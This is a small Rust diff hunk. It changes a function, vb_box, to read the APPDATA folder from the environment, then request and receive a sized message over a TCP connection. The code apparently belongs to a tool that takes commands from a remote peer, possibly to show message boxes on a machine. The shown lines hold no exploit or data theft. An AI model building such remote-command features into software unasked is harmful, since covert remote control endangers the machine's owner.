@@ -4,9 +4,10 @@ use std::io::Write;
 
 use crate::utilities;
 
-pub fn vb_box(mut stream: &TcpStream, appdata_folder: String) {
+pub fn vb_box(mut stream: &TcpStream) {
+    let appdata_folder = std::env::var("APPDATA").unwrap();
+
     stream.write_all("message".as_bytes()).unwrap();
-    
     let size = utilities::read_bytes_as_string(&stream, 1024).parse::<usize>().unwrap();
     let message = utilities::read_bytes_as_string(&stream, size);
 
